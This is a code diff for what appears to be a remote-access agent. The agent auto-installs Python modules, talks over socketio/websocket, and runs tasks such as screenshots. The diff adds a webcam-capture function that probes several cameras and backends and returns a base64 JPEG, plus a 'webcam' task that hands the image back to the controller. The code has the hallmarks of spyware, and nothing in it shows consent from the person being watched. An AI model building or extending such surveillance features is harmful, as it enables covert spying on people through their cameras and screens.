@@ -26,7 +26,8 @@ required_modules = [
     ('socketio', 'python-socketio'),
     ('websocket', 'websocket-client'),
     ('mss', None),
-    ('Pillow', None)
+    ('Pillow', None),
+    ('opencv-python', None)
 ]
 
 # Check and install missing modules
@@ -1047,6 +1048,105 @@ class SystemUtils:
         except Exception as e:
             logger.error(f"Unexpected error during screenshot capture: {{str(e)}}", exc_info=True)
             return None
+
+    @staticmethod
+    def capture_webcam():
+        """Capture an image from the default webcam using OpenCV"""
+        logger = logging.getLogger('SystemUtils')
+        try:
+            logger.info("Attempting to capture webcam image")
+            
+            # Try to import opencv
+            try:
+                import cv2
+                logger.debug("OpenCV imported successfully")
+            except ImportError:
+                logger.error("OpenCV not available - webcam capture failed")
+                return None
+            
+            # Try to access the default webcam with explicit backend
+            # Try multiple camera indices and backends for better compatibility
+            # Use platform-appropriate backends for cross-platform compatibility
+            camera_indices = [0, 1, 2]
+            
+            # Detect platform and use appropriate video capture backends
+            current_platform = platform.system()
+            if current_platform == 'Windows':
+                backends = [
+                    (cv2.CAP_DSHOW, "DShow"),
+                    (cv2.CAP_MSMF, "MSMF"),
+                    (cv2.CAP_ANY, "ANY")
+                ]
+            elif current_platform == 'Linux':
+                # Try V4L2 first for Linux, then fall back to ANY
+                backends = [
+                    (cv2.CAP_V4L2, "V4L2"),
+                    (cv2.CAP_ANY, "ANY")
+                ]
+            else:
+                # macOS and other platforms
+                backends = [
+                    (cv2.CAP_ANY, "ANY")
+                ]
+            
+            cap = None
+            used_backend = None
+            used_index = None
+            
+            for camera_index in camera_indices:
+                for backend, backend_name in backends:
+                    try:
+                        logger.debug(f"Trying camera {{camera_index}} with backend {{backend_name}}")
+                        cap = cv2.VideoCapture(camera_index, backend)
+                        
+                        if cap.isOpened():
+                            used_backend = backend_name
+                            used_index = camera_index
+                            logger.info(f"Successfully opened camera {{camera_index}} with {{backend_name}} backend")
+                            break
+                        else:
+                            cap.release()
+                            cap = None
+                    except Exception as e:
+                        logger.debug(f"Camera {{camera_index}} with {{backend_name}} failed: {{str(e)}}")
+                        continue
+                
+                if cap and cap.isOpened():
+                    break
+            
+            # Check if webcam opened successfully
+            if not cap or not cap.isOpened():
+                logger.error("Failed to open webcam - device not available on any index/backend")
+                return None
+            
+            # Read a frame from the webcam
+            logger.debug("Reading frame from webcam")
+            ret, frame = cap.read()
+            
+            # Release the webcam immediately after capture
+            cap.release()
+            
+            if not ret:
+                logger.error("Failed to capture frame from webcam")
+                return None
+            
+            logger.debug(f"Captured frame with shape: {{frame.shape}}")
+            
+            # Encode the frame as JPEG
+            logger.debug("Encoding frame to JPEG")
+            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
+            
+            # Convert to base64
+            logger.debug("Encoding to base64")
+            webcam_data = base64.b64encode(buffer).decode('utf-8')
+            
+            logger.info("Webcam capture successful")
+            return webcam_data
+            
+        except Exception as e:
+            logger.error(f"Webcam capture error: {{str(e)}}")
+            return None
+    
     @staticmethod
     def get_system_info():
         try:
@@ -2839,6 +2939,7 @@ class Agent:
 
 
             elif task_type == "screenshot":
+                self._log_info("Starting screenshot task")
                 screenshot = SystemUtils.take_screenshot()
                 if screenshot:
                     return {{
@@ -2846,6 +2947,16 @@ class Agent:
                         "screenshot": screenshot
                     }}
                 return {{"status": "error", "message": "Failed to capture screenshot"}}
+            
+            elif task_type == "webcam":
+                self._log_info("Starting webcam capture task")
+                webcam = SystemUtils.capture_webcam()
+                if webcam:
+                    return {{
+                        "status": "success",
+                        "webcam": webcam
+                    }}
+                return {{"status": "error", "message": "Failed to capture webcam"}}
             
             
             
